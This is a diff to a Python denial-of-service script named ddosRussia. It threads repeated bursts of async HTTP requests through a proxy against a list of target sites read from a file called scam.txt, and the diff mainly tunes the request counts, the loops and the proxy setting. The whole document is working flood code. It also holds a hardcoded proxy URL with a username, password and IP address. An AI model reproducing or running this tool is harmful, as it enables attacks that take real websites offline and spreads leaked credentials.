@@ -21,9 +21,11 @@ class ddosRussia:
         try:
             async with session.get(self.url, timeout=10, proxy=self.proxy) as response:
                 resp = await response.read()
+                print("asd", resp)
+
                 return response.ok
-        except Exception as e: pass
-            # print(e)
+        except Exception as e:
+            print(e)
         return
     
     async def fetch_async(self, ntimes):
@@ -45,21 +47,17 @@ def take_urls(file = 'scam.txt'):
 
 def ddos_new_site(url, proxy):
     ddos_site = ddosRussia(url, proxy)
-    for ntimes in [200]:
+    ntimes = 100
+    for i in range(1000):
         start_time = time.time()
         resp = asyncio.run(ddos_site.fetch_async(ntimes))
         print(f'Valid requests: {resp.count(True)}/{len(resp)} for site: {url} during {time.time() - start_time} seconds')
         
 if __name__ == '__main__':
-    # asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
     urls = take_urls()
-    proxy = {
-      'http': 'http://oHXOMY:uIJ0LLa6Ai@212.115.49.92:5500',
-      'https': 'http://oHXOMY:uIJ0LLa6Ai@212.115.49.92:5500',
-    }
+    proxy = 'http://oHXOMY:uIJ0LLa6Ai@212.115.49.92:5500'
 
-    for i in range(10000000):
-        for url in urls:
-            x = threading.Thread(target=ddos_new_site, args = (url, proxy))
-            x.start()
-        time.sleep(5)
+    for url in urls:
+        x = threading.Thread(target=ddos_new_site, args = (url, proxy))
+        x.start()
